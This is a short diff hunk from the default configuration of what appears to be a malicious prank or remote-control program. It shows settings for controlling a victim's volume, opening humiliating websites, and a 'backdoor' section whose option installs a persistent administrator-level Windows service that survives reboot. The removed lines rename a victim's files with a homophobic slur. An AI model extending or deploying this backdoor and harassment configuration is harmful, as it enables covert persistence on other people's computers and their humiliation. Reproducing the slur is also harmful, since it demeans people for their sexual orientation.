@@ -103,8 +103,6 @@ DEFAULT_CONFIG = {
         "control_volume": True,
         "open_humiliating_sites": True,
         "humiliating_sites": [],  # now dynamic based on activity (see get_dynamic_humiliating_site)
-        "rename_files_humiliating": True,
-        "rename_prefix": "owned_fag_"
     },
     "backdoor": {
         "windows_service": False,  # WARNING: Installs as persistent service under admin. Survives reboot/logoff.
